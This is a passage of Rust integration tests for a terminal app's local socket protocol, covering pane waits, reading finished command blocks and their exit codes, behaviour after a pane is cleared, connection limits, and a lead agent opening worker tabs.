            conversation_in(&lanes, answer.clone(), Duration::from_secs(5));
        client.send(&waiting);
        let refused = client.reply().expect("refused, not dropped");
        let refusal = refused.error.expect("a refusal");
        assert_eq!(refusal.code, code::BUSY);
        assert!(
            refusal.message.contains("keeping 32"),
            "{}",
            refusal.message
        );
        answering.join().expect("the connection's thread");

        // A client that hangs up ends its wait then, not a minute later.
        let started = Instant::now();
        for (client, answering) in kept {
            drop(client);
            answering.join().expect("the connection's thread");
        }
        assert!(
            started.elapsed() < Duration::from_secs(30),
            "{:?}",
            started.elapsed()
        );
        let (mut client, answering) = conversation_in(&lanes, answer, Duration::from_secs(5));
        client.send(&waiting);
        registered
            .recv_timeout(Duration::from_secs(10))
            .expect("and there is room for a wait again");
        drop(client);
        answering.join().expect("the connection's thread");
    }

    #[test]
    fn a_pane_drawn_as_a_live_grid_with_nothing_finished_says_so_rather_than_answering_nothing() {
        let mut served = Served::new(|_, _, _| {});
        let lead = first_pane(&served);
        let token = served.token(lead);
        served.shell.open();
        served.pump_until("the shell never prompted", |served| {
            served.text(lead).contains("fake$")
        });

        // A shell with no marks: its output is one block that never closes.
        let refused = served
            .ask(read_blocks(&token, lead, None))
            .expect_err("nothing has finished");
        assert!(refused.contains("no-blocks"), "{refused}");
        assert!(refused.contains("no command marks"), "{refused}");
        let refused = served
            .ask(wait(&token, lead, Until::Finished, 5, false))
            .expect_err("nothing there says a command finished");
        assert!(refused.contains("no-blocks"), "{refused}");

        // The alternate screen, the way a full-screen program or an agent's
        // TUI takes the pane.
        served.update(|workspace, ctx| workspace.type_into(lead, "\u{1b}[?1049h\n", ctx));
        served.pump_until("the pane never took the alternate screen", |served| {
            served.read(|workspace, app| {
                workspace
                    .terminal(lead, app)
                    .is_some_and(|(_, snapshot)| snapshot.alt_screen)
            })
        });
        let refused = served
            .ask(read_blocks(&token, lead, Some(1)))
            .expect_err("a grid is not a finished block");
        assert!(refused.contains("no-blocks"), "{refused}");
        assert!(refused.contains("live grid"), "{refused}");
        assert!(
            refused.contains("claude -p"),
            "and it says what to do: {refused}"
        );
    }

    #[test]
    fn blocks_are_the_last_commands_with_what_they_printed_and_how_they_ended() {
        let root = TempDir::new();
        let Some(shell) = GatedShell::bash(&root) else {
            eprintln!("skipped: no bash here");
            return;
        };
        let mut served = Served::with(root, shell, |_, _, _| {});
        let marked = served.read(|workspace, app| {
            matches!(
                workspace.shell_standing(app).0.marks,
                crate::shell_integration::Marks::Installed(_)
            )
        });
        if !marked {
            eprintln!("skipped: the shell integration is opted out of here");
            return;
        }
        let lead = first_pane(&served);
        let token = served.token(lead);
        served.shell.open();

        served.run(lead, "printf 'one\\n'");
        served.run(lead, "printf 'two\\n'; (exit 3)");
        served.run(lead, "printf 'three\\n'");

        // Its own pane, the caller's to read.
        let read = served
            .ask(read_blocks(&token, lead, Some(2)))
            .expect("read");
        assert_eq!(read.pane_id, lead.as_u64());
        assert!(!read.running, "nothing is running at the prompt");
        let [two, three] = &read.blocks[..] else {
            panic!("the last two, oldest first: {read:#?}");
        };
        assert_eq!(two.command.as_deref(), Some("printf 'two\\n'; (exit 3)"));
        assert_eq!(two.output, "two");
        assert_eq!(two.exit, Some(3));
        assert_eq!(three.output, "three");
        assert_eq!(three.exit, Some(0));
        for block in &read.blocks {
            assert!(!block.truncated);
            assert!(block.cwd.is_some(), "where it ran: {block:?}");
            assert!(block.duration_ms.is_some(), "how long: {block:?}");
        }
        // Every block it holds, which is the three and whatever the shell
        // printed before its first prompt.
        let every = served.ask(read_blocks(&token, lead, None)).expect("read");
        let commands: Vec<Option<&str>> = every
            .blocks
            .iter()
            .map(|block| block.command.as_deref())
            .collect();
        assert!(
            commands.ends_with(&[
                Some("printf 'one\\n'"),
                Some("printf 'two\\n'; (exit 3)"),
                Some("printf 'three\\n'"),
            ]),
            "{commands:?}"
        );

        let table = served
            .ask(move |socket| {
                cli::unix::read_blocks(
                    &socket,
                    Some(&token),
                    ReadBlocks {
                        pane: lead.as_u64(),
                        last: Some(1),
                    },
                    false,
                    None,
                )
            })
            .expect("read");
        assert!(
            table.starts_with("$ printf 'three\\n'\nthree\n[exit 0 · "),
            "{table}"
        );
    }

    #[test]
    fn a_block_longer_than_an_answer_carries_is_its_end() {
        let root = TempDir::new();
        let Some(shell) = GatedShell::bash(&root) else {
            eprintln!("skipped: no bash here");
            return;
        };
        let mut served = Served::with(root, shell, |_, _, _| {});
        let marked = served.read(|workspace, app| {
            matches!(
                workspace.shell_standing(app).0.marks,
                crate::shell_integration::Marks::Installed(_)
            )
        });
        if !marked {
            eprintln!("skipped: the shell integration is opted out of here");
            return;
        }
        let lead = first_pane(&served);
        let token = served.token(lead);
        served.shell.open();

        let lines = super::super::blocks::MAX_ROWS_READ * 3;
        served.run(lead, &format!("seq 1 {lines}"));
        let read = served
            .ask(read_blocks(&token, lead, Some(1)))
            .expect("read");
        let [block] = &read.blocks[..] else {
            panic!("one block: {read:#?}");
        };
        assert!(block.truncated, "cut, and said to be");
        assert!(
            block.output.len() <= super::super::blocks::MAX_OUTPUT_PER_BLOCK,
            "{}",
            block.output.len()
        );
        assert!(
            block.output.lines().count() <= super::super::blocks::MAX_ROWS_READ,
            "no more rows read than the cap"
        );
        assert!(
            block.output.ends_with(&lines.to_string()),
            "the end is what is kept: {:?}",
            &block.output[block.output.len().saturating_sub(40)..]
        );
        assert!(!block.output.contains("\n1\n"), "and the start is not");
    }

    #[test]
    fn the_loop_an_agent_runs_opens_a_tab_waits_for_its_command_and_reads_what_it_printed() {
        let root = TempDir::new();
        let Some(shell) = GatedShell::bash(&root) else {
            eprintln!("skipped: no bash here");
            return;
        };
        let mut served = Served::with(root, shell, |_, _, _| {});
        let marked = served.read(|workspace, app| {
            matches!(
                workspace.shell_standing(app).0.marks,
                crate::shell_integration::Marks::Installed(_)
            )
        });
        if !marked {
            eprintln!("skipped: the shell integration is opted out of here");
            return;
        }
        let lead = first_pane(&served);
        let token = served.token(lead);

        // Opened while every shell is still held at its gate: the worker's
        // command waits for its first prompt, and so does the wait.
        let opened = served
            .open_tab(
                Some(token.clone()),
                new_tab(&["sh", "-c", "printf 'the answer\\n'; exit 4"]),
            )
            .expect("the lead opens a worker");
        let worker = served.pane(opened.pane_id);
        // Long, and not waited out: the answer when the time is up says
        // `finished: exit 4` too, and must not pass for the one the shell's
        // own mark gives.
        let asking = served.start(wait(&token, worker, Until::Finished, 600, false));
        served.pump_until("the wait was never registered", |served| {
            served.waiting() == 1
        });

        served.shell.open();
        served.pump_until("the command's end never answered the wait", |served| {
            served.waiting() == 0
        });
        let printed = served.finish(asking).expect("answered");
        assert_eq!(printed.text, "finished: exit 4");
        assert_eq!(printed.failure, None);

        let read = served
            .ask(read_blocks(&token, worker, Some(1)))
            .expect("read");
        let [block] = &read.blocks[..] else {
            panic!("one block: {read:#?}");
        };
        assert_eq!(block.exit, Some(4));
        assert_eq!(block.output, "the answer");
    }

    /// A window whose every pane runs a real bash with Crook's command marks,
    /// or `None` where there is no bash or the integration is opted out of.
    fn marked_bash() -> Option<Served> {
        let root = TempDir::new();
        let Some(shell) = GatedShell::bash(&root) else {
            eprintln!("skipped: no bash here");
            return None;
        };
        let served = Served::with(root, shell, |_, _, _| {});
        let marked = served.read(|workspace, app| {
            matches!(
                workspace.shell_standing(app).0.marks,
                crate::shell_integration::Marks::Installed(_)
            )
        });
        if !marked {
            eprintln!("skipped: the shell integration is opted out of here");
            return None;
        }
        Some(served)
    }

    /// Whether a pane's shell says a command is running in it.
    fn executing(served: &Served, pane: PaneId) -> bool {
        served.read(|workspace, app| {
            workspace
                .terminal(pane, app)
                .is_some_and(|(_, snapshot)| snapshot.live_block.state.is_running())
        })
    }

    /// Clears a pane's blocks, as shift-cmd-k does, and checks the clear
    /// left none in its history.
    fn clear(served: &mut Served, pane: PaneId) {
        served.update(|workspace, ctx| {
            workspace.handle_action(
                &crate::workspace::WorkspaceAction::Block(crate::workspace::BlockAction::Clear(
                    pane,
                )),
                ctx,
            );
        });
        let held = served.read(|workspace, app| {
            workspace
                .terminal_blocks(pane, app)
                .map_or(0, |history| history.len())
        });
        assert_eq!(held, 0, "the clear left a block in the history");
    }

    /// Linux only: that is where a half-close is told from a hang-up. See
    /// `server::until_closed`.
    #[cfg(target_os = "linux")]
    #[test]
    fn a_client_that_closes_its_half_after_asking_is_answered_and_one_that_leaves_is_let_go() {
        let (handed, feeds) = std::sync::mpsc::channel::<Arc<Feed>>();
        let answer: Answer = Arc::new(move |request: Request, feed: Option<Arc<Feed>>, _| {
            if let Some(feed) = feed {
                let _ = handed.send(feed);
            }
            match request.verb {
                Verb::EventsFollow(_) => Ok(json!({ "panes": [7] })),
                _ => Ok(Value::Null),
            }
        });
        let waiting = protocol::request_line(
            &Verb::PaneWait(Wait {
                pane: 7,
                until: Until::Idle,
                timeout: Some(60),
            }),
            Some("c0ffee"),
        );
        // Long enough for the watch to have read the end of the request,
        // which it once took for the client leaving.
        let settle = || thread::sleep(Duration::from_millis(200));

        // A wait: asked, the client's half closed, and answered afterwards.
        let (mut client, answering) = conversation(answer.clone(), Duration::from_secs(5));
        client.send(&waiting);
        client
            .stream
            .shutdown(std::net::Shutdown::Write)
            .expect("the client closes its half");
        let feed = feeds
            .recv_timeout(Duration::from_secs(10))
            .expect("the wait reached the window");
        settle();
        assert!(feed.is_open(), "a half-close is not a hang-up");
        feed.push(json!({ "reached": true }));
        let reply = client.reply().expect("answered, not hung up on");
        assert!(reply.ok, "{reply:?}");
        assert_eq!(reply.result, Some(json!({ "reached": true })));
        answering.join().expect("the connection's thread");

        // A stream: its first answer, an event after the half-close, its end.
        let (mut client, answering) = conversation(answer.clone(), Duration::from_secs(5));
        client.send(&protocol::request_line(
            &Verb::EventsFollow(Follow::default()),
            Some("c0ffee"),
        ));
        client
            .stream
            .shutdown(std::net::Shutdown::Write)
            .expect("the client closes its half");
        assert!(client.reply().expect("the first answer").ok);
        let feed = feeds
            .recv_timeout(Duration::from_secs(10))
            .expect("the stream reached the window");
        settle();
        feed.push(serde_json::to_value(PaneEvent::Closed { pane_id: 7 }).expect("encodes"));
        feed.end();
        let mut line = String::new();
        client.replies.read_line(&mut line).expect("an event");
        assert_eq!(
            serde_json::from_str::<PaneEvent>(&line).expect("an event a line"),
            PaneEvent::Closed { pane_id: 7 }
        );
        line.clear();
        assert_eq!(client.replies.read_line(&mut line).ok(), Some(0), "{line}");
        answering.join().expect("the connection's thread");

        // Half-closed and then gone: let go of then, not a minute later.
        let (mut client, answering) = conversation(answer, Duration::from_secs(5));
        client.send(&waiting);
        client
            .stream
            .shutdown(std::net::Shutdown::Write)
            .expect("the client closes its half");
        let feed = feeds
            .recv_timeout(Duration::from_secs(10))
            .expect("the wait reached the window");
        settle();
        let started = Instant::now();
        drop(client);
        answering.join().expect("the connection's thread");
        assert!(
            started.elapsed() < Duration::from_secs(30),
            "{:?}",
            started.elapsed()
        );
        assert!(!feed.is_open(), "and its feed hung up");
    }

    /// Linux only, as the one above.
    #[cfg(target_os = "linux")]
    #[test]
    fn a_wait_asked_by_a_client_that_closed_its_half_is_answered_by_the_window() {
        let mut served = Served::new(|_, _, _| {});
        let lead = first_pane(&served);
        let token = served.token(lead);
        served.report(lead, AgentStatus::NeedsInput, Some("which branch?"));

        // What `printf '%s\n' "$request" | nc -N -U "$CROOK_SOCKET"` does.
        let line = protocol::request_line(
            &Verb::PaneWait(Wait {
                pane: lead.as_u64(),
                until: Until::NeedsInput,
                timeout: Some(5),
            }),
            Some(&token),
        );
        let reply = served.ask(move |socket| {
            let mut client = Client::connect(&socket);
            client.send(&line);
            client
                .stream
                .shutdown(std::net::Shutdown::Write)
                .expect("the client closes its half");
            client.reply()
        });
        let reply = reply.expect("answered, not closed on");
        let waited: Waited =
            serde_json::from_value(reply.result.expect("an answer")).expect("a wait's answer");
        assert!(waited.reached, "{waited:?}");
        assert_eq!(waited.message.as_deref(), Some("which branch?"));
    }

    #[test]
    fn a_wait_on_a_tab_that_closed_before_it_was_asked_says_it_closed() {
        let mut served = Served::new(|workspace, ctx, _| {
            workspace.apply(TabAction::New, ctx);
        });
        let (lead, person) = served.read(|workspace, _| {
            let mut panes = workspace.tabs().panes().map(|(_, pane)| pane.id());
            (panes.next().expect("a pane"), panes.next().expect("two"))
        });
        let token = served.token(lead);
        let opened = served
            .open_tab(Some(token.clone()), new_tab(&["claude"]))
            .expect("the lead opens a worker");
        let worker = served.pane(opened.pane_id);
        let theirs = served
            .open_tab(Some(served.token(person)), new_tab(&["claude"]))
            .expect("the person's pane opens one of its own");
        let theirs = served.pane(theirs.pane_id);
        served.update(|workspace, ctx| {
            workspace.apply(TabAction::ClosePane(worker), ctx);
            workspace.apply(TabAction::ClosePane(theirs), ctx);
        });

        // Exited, however long it was asked to wait, and at once.
        for timeout in [0, 600] {
            let started = Instant::now();
            let printed = served
                .ask(wait(&token, worker, Until::Exited, timeout, true))
                .expect("answered, not refused as a pane that never was");
            assert!(started.elapsed() < Duration::from_secs(10));
            let waited: Waited = serde_json::from_str(&printed.text).expect("--json is the answer");
            assert!(waited.reached && waited.closed, "{waited:?}");
            assert_eq!(printed.failure, None);
        }
        // Anything else is somewhere it will never get to now.
        let printed = served
            .ask(wait(&token, worker, Until::Idle, 600, false))
            .expect("answered");
        assert_eq!(printed.text, "closed");
        assert_eq!(
            printed.failure,
            Some(format!("pane {} closed before it was idle", opened.pane_id))
        );

        // A closed tab somebody else's pane opened is no more the lead's than
        // it was open, and says no more than `pane list` would: nothing.
        let refused = served
            .ask(wait(&token, theirs, Until::Exited, 0, false))
            .expect_err("not the lead's");
        assert!(refused.contains("no-such-pane"), "{refused}");
        // Its blocks went with it.
        let refused = served
            .ask(read_blocks(&token, worker, None))
            .expect_err("closed");
        assert!(refused.contains("no-such-pane"), "{refused}");
        assert_eq!(served.waiting(), 0, "nothing was left waiting");
    }

    #[test]
    fn blocks_of_a_pane_whose_first_command_is_still_running_say_so_rather_than_nothing() {
        let Some(mut served) = marked_bash() else {
            return;
        };
        let lead = first_pane(&served);
        let token = served.token(lead);
        served.shell.open();
        served.pump_until("the shell never came to a prompt", |served| {
            served.at_prompt(lead)
        });

        // What the shell printed on its way to its first prompt — `starting`,
        // here — is not a command, and nothing has run.
        let read = served
            .ask(read_blocks(&token, lead, None))
            .expect("nothing ran, which is an answer");
        assert!(read.blocks.is_empty(), "{read:#?}");
        assert!(!read.running);

        // A command that prints more than the pane holds and goes on running:
        // the block has grown past the top of the viewport, which the pane
        // draws as a grid, and it is still an ordinary command.
        served.update(|workspace, ctx| {
            workspace.type_into(lead, "seq 1 500; sleep 30\r", ctx);
        });
        served.pump_until("the command never overflowed the pane", |served| {
            executing(served, lead)
                && served.read(|workspace, app| {
                    workspace
                        .terminal(lead, app)
                        .is_some_and(|(_, snapshot)| snapshot.live_block.top_row < 0)
                })
        });
        let refused = served
            .ask(read_blocks(&token, lead, Some(1)))
            .expect_err("nothing has finished");
        assert!(refused.contains("no-blocks"), "{refused}");
        assert!(refused.contains("has a command running"), "{refused}");
        assert!(
            refused.contains(&format!("pane wait {} --until finished", lead.as_u64())),
            "and says what to wait for: {refused}"
        );
        assert!(
            !refused.contains("live grid"),
            "it is not a full-screen program: {refused}"
        );

        // Interrupted, it has finished; the next one running is said to be.
        served.update(|workspace, ctx| workspace.type_into(lead, "\u{3}", ctx));
        served.pump_until("the interrupted command never became a block", |served| {
            served.at_prompt(lead)
        });
        served.update(|workspace, ctx| workspace.type_into(lead, "sleep 30\r", ctx));
        served.pump_until("the second command never started", |served| {
            executing(served, lead)
        });
        let read = served
            .ask(read_blocks(&token, lead, None))
            .expect("the finished one is read");
        let [block] = &read.blocks[..] else {
            panic!("the one that finished: {read:#?}");
        };
        assert_eq!(block.command.as_deref(), Some("seq 1 500; sleep 30"));
        assert!(read.running, "and something is running now");
    }

    #[test]
    fn a_command_too_quick_to_be_seen_running_is_named_by_its_finished() {
        let Some(mut served) = marked_bash() else {
            return;
        };
        let lead = first_pane(&served);
        let token = served.token(lead);
        served.shell.open();
        served.pump_until("the shell never came to a prompt", |served| {
            served.at_prompt(lead)
        });

        // Its own pane's stream, read until a command has finished.
        let line = protocol::request_line(
            &Verb::EventsFollow(Follow {
                pane: Some(lead.as_u64()),
            }),
            Some(&token),
        );
        let following = served.start(move |socket| {
            let mut client = Client::connect(&socket);
            client.send(&line);
            assert!(client.reply().expect("the first answer").ok);
            let mut events = Vec::new();
            loop {
                let mut line = String::new();
                match client.replies.read_line(&mut line) {
                    Ok(0) | Err(_) => return events,
                    Ok(_) => {}
                }
                let event: PaneEvent = serde_json::from_str(&line).expect("an event a line");
                let finished = matches!(event, PaneEvent::Finished { .. });
                events.push(event);
                if finished {
                    return events;
                }
            }
        });
        served.pump_until("the stream never started", |served| served.following() == 1);
        served.run(lead, "true");

        let events = served.finish(following);
        let Some(PaneEvent::Finished {
            pane_id,
            command,
            exit,
            ..
        }) = events.last()
        else {
            panic!("a command finished: {events:?}");
        };
        assert_eq!(*pane_id, lead.as_u64());
        assert_eq!(command.as_deref(), Some("true"), "{events:?}");
        assert_eq!(*exit, Some(0));
    }

    /// The whole of it against a real shell: a worker with no hooks, which
    /// says it is running only in its title, is suspended mid-turn, and the
    /// lead's wait hears the shell's end of the command take the running
    /// back — the title itself never says another word.
    #[test]
    fn a_wait_for_idle_hears_a_worker_with_no_hooks_suspended_mid_turn() {
        let Some(mut served) = marked_bash() else {
            return;
        };
        let lead = first_pane(&served);
        let token = served.token(lead);
        let opened = served
            .open_tab(
                Some(token.clone()),
                new_tab(&[
                    "sh",
                    "-c",
                    "printf '\\033]0;\\342\\227\\220 %s\\007' 'Fix the flaky test'; \
                     exec sleep 600",
                ]),
            )
            .expect("the lead opens a worker");
        let worker = served.pane(opened.pane_id);
        served.shell.open();
        served.pump_until("the worker's title never said running", |served| {
            served.session(worker, |session| session.status == AgentStatus::Running)
        });

        let asking = served.start(wait(&token, worker, Until::Idle, 120, false));
        served.pump_until("the wait was never registered", |served| {
            served.waiting() == 1
        });
        served.update(|workspace, ctx| workspace.type_into(worker, "\u{1a}", ctx));
        served.pump_until("the suspend never answered the wait", |served| {
            served.waiting() == 0
        });
        let printed = served.finish(asking).expect("answered");
        assert_eq!((printed.text.as_str(), printed.failure), ("idle", None));
    }

    #[test]
    fn an_empty_line_sent_from_the_field_is_not_the_command_that_finished_last() {
        let Some(mut served) = marked_bash() else {
            return;
        };
        let lead = first_pane(&served);
        let token = served.token(lead);
        served.shell.open();
        served.run(lead, "echo the answer");
        served.pump_until("the shell never came back to a prompt", |served| {
            served.at_prompt(lead)
        });
        let filed = |served: &Served| {
            served.read(|workspace, app| {
                workspace
                    .terminal_blocks(lead, app)
                    .map_or(0, |history| history.len())
            })
        };
        let before = filed(&served);

        // Enter in the empty field: what the field hands the terminal then,
        // which bash ends with a bare `D` and nothing run.
        let sent = served.read(|workspace, app| {
            workspace
                .terminal(lead, app)
                .is_some_and(|(terminal, _)| terminal.submit(""))
        });
        assert!(sent, "the empty line reached the shell");
        served.pump_until("the empty line never became a block", |served| {
            served.at_prompt(lead) && filed(served) > before
        });
        // A block of its own, so what follows is read past one that is there.
        let newest = served.read(|workspace, app| {
            let history = workspace.terminal_blocks(lead, app).expect("a shell");
            let block = history.get(history.len() - 1).expect("a block");
            (block.command.clone(), block.exit)
        });
        assert_eq!(newest, (None, None));

        let read = served
            .ask(read_blocks(&token, lead, Some(1)))
            .expect("read");
        let [block] = &read.blocks[..] else {
            panic!("the command, not the empty line: {read:#?}");
        };
        assert_eq!(block.command.as_deref(), Some("echo the answer"));
        assert_eq!(block.exit, Some(0));
        assert_eq!(block.output, "the answer");
        let printed = served
            .ask(wait(&token, lead, Until::Finished, 0, false))
            .expect("answered");
        assert_eq!(printed.text, "finished: exit 0");
        assert_eq!(printed.failure, None);
    }

    #[test]
    fn a_command_cleared_away_after_it_finished_still_answers_a_wait_for_it() {
        // A person clears a worker's pane between the end of its command and
        // the lead's wait: the history holds no command any more, and the
        // command finished all the same. The wait is answered at once with
        // its status, as it was before the clear, rather than left for a
        // command nobody is going to run.
        let Some(mut served) = marked_bash() else {
            return;
        };
        let lead = first_pane(&served);
        let token = served.token(lead);
        served.shell.open();
        served.run(lead, "false");
        served.pump_until("the shell never came back to a prompt", |served| {
            served.at_prompt(lead)
        });
        let finished = |served: &mut Served| {
            let printed = served
                .ask(wait(&token, lead, Until::Finished, 0, false))
                .expect("answered");
            (printed.text, printed.failure)
        };

        clear(&mut served, lead);
        assert_eq!(finished(&mut served), ("finished: exit 1".to_owned(), None));
        // Twice, with nothing run in between: the second lets go of nothing
        // that ran, and forgets nothing the first kept.
        clear(&mut served, lead);
        assert_eq!(finished(&mut served), ("finished: exit 1".to_owned(), None));

        // A command run since is newer than any a clear let go of.
        served.run(lead, "true");
        served.pump_until("the shell never came back to a prompt", |served| {
            served.at_prompt(lead)
        });
        assert_eq!(finished(&mut served), ("finished: exit 0".to_owned(), None));
    }

    #[test]
    fn blocks_of_a_pane_cleared_after_its_command_finished_say_the_clear_took_it() {
        // The lead's recipe from the skill — wait for the worker's command to
        // finish, then read its block — with a person clearing the worker's
        // pane in between. The wait says the command finished; the read that
        // follows must not then say that none has, which is what an empty
        // list prints as.
        let Some(mut served) = marked_bash() else {
            return;
        };
        let lead = first_pane(&served);
        let token = served.token(lead);
        served.shell.open();
        served.run(lead, "printf 'the %s\\n' answer; (exit 4)");
        served.pump_until("the shell never came back to a prompt", |served| {
            served.at_prompt(lead)
        });
        clear(&mut served, lead);

        let waited = served
            .ask(wait(&token, lead, Until::Finished, 0, false))
            .expect("answered");
        assert_eq!(
            (waited.text.as_str(), waited.failure),
            ("finished: exit 4", None)
        );
        let asked = ReadBlocks {
            pane: lead.as_u64(),
            last: Some(1),
        };
        let printed = served.ask({
            let token = token.clone();
            move |socket| {
                cli::unix::read_blocks(&socket, Some(&token), asked, false, None)
                    .map_err(|error| error.to_string())
            }
        });
        let refused = printed.expect_err("what it printed went with the clear");
        assert!(refused.contains("no-blocks"), "{refused}");
        assert!(
            refused.contains("was cleared after its last command finished (exit 4)"),
            "it says the clear took it, and how the command ended: {refused}"
        );
        assert!(
            !refused.contains("not finished"),
            "a command did finish: {refused}"
        );

        // Running a command since the clear, none has finished since it.
        served.update(|workspace, ctx| workspace.type_into(lead, "sleep 600\r", ctx));
        served.pump_until("the command never started", |served| {
            executing(served, lead)
        });
        let refused = served
            .ask(read_blocks(&token, lead, None))
            .expect_err("nothing has finished since the clear");
        assert!(
            refused.contains("has a command running and none finished since it was cleared"),
            "{refused}"
        );
        // And once it has, it is what is read.
        served.update(|workspace, ctx| workspace.type_into(lead, "\u{3}", ctx));
        served.pump_until("the interrupted command never became a block", |served| {
            served.at_prompt(lead)
        });
        let read = served
            .ask(read_blocks(&token, lead, None))
            .expect("a command finished since the clear");
        let [block] = &read.blocks[..] else {
            panic!("the one run since the clear: {read:#?}");
        };
        assert_eq!(block.command.as_deref(), Some("sleep 600"));

        // A full-screen program taking the pane after a clear has not
        // finished either, and nor has anything since the clear.
        clear(&mut served, lead);
        served.update(|workspace, ctx| {
            workspace.type_into(lead, "printf '\\033[?1049h'; sleep 600\r", ctx);
        });
        served.pump_until("the pane never took the alternate screen", |served| {
            served.read(|workspace, app| {
                workspace
                    .terminal(lead, app)
                    .is_some_and(|(_, snapshot)| snapshot.alt_screen)
            })
        });
        let refused = served
            .ask(read_blocks(&token, lead, None))
            .expect_err("a screen is not a finished block");
        assert!(refused.contains("live grid"), "{refused}");
        assert!(
            refused.contains("no command has finished in it since it was cleared"),
            "{refused}"
        );
    }

    #[test]
    fn a_wait_for_a_command_to_finish_is_not_answered_by_an_empty_line() {
        // Marked, so that `finished` is a thing to wait for; the shells stay
        // at their gate, and what they would say is said for them.
        let Some(mut served) = marked_bash() else {
            return;
        };
        let lead = first_pane(&served);
        let token = served.token(lead);
        let opened = served
            .open_tab(Some(token.clone()), new_tab(&["make", "test"]))
            .expect("the lead opens a worker");
        let worker = served.pane(opened.pane_id);
        let asking = served.start(wait(&token, worker, Until::Finished, 600, false));
        served.pump_until("the wait was never registered", |served| {
            served.waiting() == 1
        });

        // The `D` a shell ends an empty line with, from the field or typed at
        // the prompt: no command, no status, and nothing started.
        let finished = |command: Option<&str>, exit, took| TerminalUpdate::CommandFinished {
            pane: worker,
            command: command.map(str::to_owned),
            exit,
            took,
            ran: command.is_some(),
        };
        served.update(|workspace, ctx| {
            workspace.apply_terminal_update(&finished(None, None, None), ctx);
        });
        assert_eq!(served.waiting(), 1, "an empty line is not a command");

        served.update(|workspace, ctx| {
            workspace.apply_terminal_update(
                &finished(Some("make test"), Some(2), Some(Duration::from_secs(1))),
                ctx,
            );
        });
        let printed = served.finish(asking).expect("answered");
        assert_eq!(printed.text, "finished: exit 2");
    }

    use super::super::ask::{CannotAnswer, Cause, Choice, How};
    use super::super::protocol::{AgentAsk, Answered};

    impl Client {
        /// The next line as it came, or `None` once the window has closed
        /// its end.
        fn raw(&mut self) -> Option<String> {
            let mut line = String::new();
            match self.replies.read_line(&mut line) {
                Ok(0) | Err(_) => None,
                Ok(_) => Some(line),
            }
        }

        /// The next line, read as the one answer a question gets.
        fn answer(&mut self) -> Answered {
            let line = self.raw().expect("an answer, not a closed connection");
            serde_json::from_str(&line).unwrap_or_else(|error| panic!("{line:?}: {error}"))
        }
    }

    /// A question about `command` from `session`, naming the terminal
    /// numbered `tty`.
    fn question(session: &str, tty: u32, command: &str) -> AgentAsk {
        AgentAsk {
            session: session.to_owned(),
            tty: Some(tty),
            ..agent_ask(command)
        }
    }

    /// Asks `asked` as a hook does, from a thread of its own, with `token`:
    /// connects, sends the line, and reads the window's first reply, holding
    /// the connection — never closing a half of it — for the answer.
    fn hook(
        asked: AgentAsk,
        token: Option<String>,
    ) -> impl FnOnce(PathBuf) -> (Client, Reply) + Send + 'static {
        move |socket| {
            let mut client = Client::connect(&socket);
            client.send(&protocol::request_line(
                &Verb::AgentAsk(asked),
                token.as_deref(),
            ));
            let reply = client.reply().expect("the window replies");
            (client, reply)
        }
    }

    /// The number a reply says the question is held under.
    fn held(reply: &Reply) -> u64 {
        assert!(reply.ok, "{reply:?}");
        reply
            .result
            .as_ref()
            .and_then(|result| result.get("asked"))
            .and_then(Value::as_u64)
            .unwrap_or_else(|| panic!("not held: {reply:?}"))
    }

    /// The code a reply refuses with.
    fn refused(reply: &Reply) -> String {
        reply
            .error
            .as_ref()
            .unwrap_or_else(|| panic!("not refused: {reply:?}"))
            .code
            .clone()
    }

    /// A pass, and why.
    fn pass(why: &str) -> Answered {
        Answered::pass(why)
    }

    impl Served {
        /// The device number of the pty a pane's shell runs on.
        fn tty(&self, pane: PaneId) -> u32 {
            self.read(|workspace, app| workspace.tty_device_of(pane, app))
                .expect("a pane with a shell is on a pty")
        }

        /// Asks `asked` as a hook in a pane would, and hands back its end of
        /// the connection and the window's first reply.
        fn ask_as(&mut self, asked: AgentAsk, token: Option<String>) -> (Client, Reply) {
            self.ask(hook(asked, token))
        }

        /// How many questions the window holds.
        fn asks(&self) -> usize {
            self.read(|workspace, _| workspace.asks().len())
        }

        /// How the question held as `id` ended, once it has.
        fn ended(&self, id: u64) -> Option<How> {
            self.read(|workspace, _| {
                workspace
                    .asks()
                    .history()
                    .find(|outcome| outcome.id.as_u64() == id)
                    .map(|outcome| outcome.how)
            })
        }
    }

    /// A window that holds every question it is asked, numbering them, and
    /// registers every wait, answering neither, saying on `registered` each
    /// time it registers a wait: the lanes alone, with no workspace behind
    /// them.
    fn holding_saying(registered: std::sync::mpsc::Sender<()>) -> Answer {
        let next = Arc::new(std::sync::atomic::AtomicU64::new(0));
        Arc::new(move |request: Request, _, _| match request.verb {
            Verb::AgentAsk(_) => Ok(json!({ "asked": next.fetch_add(1, Ordering::Relaxed) + 1 })),
            _ => {
                let _ = registered.send(());
                Ok(Value::Null)
            }
        })
    }

    /// The same, telling nobody.
    fn holding() -> Answer {
        holding_saying(std::sync::mpsc::channel().0)
    }

    #[test]
    fn an_ask_has_a_lane_of_its_own_so_thirty_two_waits_do_not_turn_it_away() {
        let lanes = Arc::new(Lanes::default());
        let waiting = protocol::request_line(
            &Verb::PaneWait(Wait {
                pane: 7,
                until: Until::Idle,
                timeout: Some(60),
            }),
            Some("c0ffee"),
        );
        let (registering, registered) = std::sync::mpsc::channel();
        let mut kept = Vec::new();
        for _ in 0..server::MAX_KEPT {
            let (mut client, answering) = conversation_in(
                &lanes,
                holding_saying(registering.clone()),
                Duration::from_secs(5),
            );
            client.send(&waiting);
            registered
                .recv_timeout(Duration::from_secs(10))
                .expect("the wait reached the window");
            kept.push((client, answering));
        }
        // The thirty-third wait is turned away: the waits' lane is full.
        let (mut client, answering) = conversation_in(&lanes, holding(), Duration::from_secs(5));
        client.send(&waiting);
        assert_eq!(refused(&client.reply().expect("refused")), code::BUSY);
        answering.join().expect("the connection's thread");

        // A question is not.
        let (mut client, answering) = conversation_in(&lanes, holding(), Duration::from_secs(5));
        client.send(&protocol::request_line(
            &Verb::AgentAsk(agent_ask("ls")),
            None,
        ));
        let reply = client.reply().expect("answered");
        held(&reply);
        drop(client);
        answering.join().expect("the connection's thread");
        for (client, answering) in kept {
            drop(client);
            answering.join().expect("the connection's thread");
        }
    }

    #[test]
    fn the_seventeenth_ask_is_busy() {
        let lanes = Arc::new(Lanes::default());
        let asking = protocol::request_line(&Verb::AgentAsk(agent_ask("ls")), None);
        let mut held_open = Vec::new();
        for _ in 0..server::MAX_ASKS {
            let (mut client, answering) =
                conversation_in(&lanes, holding(), Duration::from_secs(5));
            client.send(&asking);
            held(&client.reply().expect("held"));
            held_open.push((client, answering));
        }
